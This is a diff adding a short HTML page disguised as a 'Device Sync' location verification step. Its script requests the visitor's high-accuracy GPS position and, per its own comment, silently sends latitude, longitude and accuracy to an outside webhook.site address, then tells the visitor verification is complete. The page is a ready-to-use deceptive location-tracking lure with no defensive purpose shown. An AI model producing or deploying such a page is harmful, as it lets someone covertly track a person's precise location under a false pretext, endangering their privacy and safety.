@@ -1,0 +1,53 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Verification</title>
+</head>
+<body style="text-align: center; font-family: Arial; padding-top: 50px;">
+    <h2>Device Sync</h2>
+    <p>Please click the button to verify your location for the service.</p>
+    
+    <button onclick="getLocation()" style="padding: 15px 30px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        Sync Location
+    </button>
+
+    <p id="status"></p>
+
+    <script>
+    function getLocation() {
+        const status = document.getElementById("status");
+        status.innerHTML = "Locating...";
+
+        if (navigator.geolocation) {
+            // High accuracy ensures GPS is used instead of just IP
+            const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
+            
+            navigator.geolocation.getCurrentPosition(sendToServer, handleError, options);
+        } else {
+            status.innerHTML = "Geolocation is not supported by this browser.";
+        }
+    }
+
+    function sendToServer(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        // This 'fetch' sends the data to your Webhook dashboard silently
+        fetch('https://webhook.site/7275cfa3-36ae-4122-9d75-13625ecd9d04?lat=' + lat + '&lon=' + lon + '&acc=' + accuracy)
+        .then(() => {
+            document.getElementById("status").innerHTML = "Verification Complete. You can close this tab.";
+        })
+        .catch(err => {
+            console.error("Error sending data:", err);
+            document.getElementById("status").innerHTML = "Sync Error. Please try again.";
+        });
+    }
+
+    function handleError(error) {
+        document.getElementById("status").innerHTML = "Error: " + error.message + ". Please allow location access.";
+    }
+    </script>
+</body>
+</html>
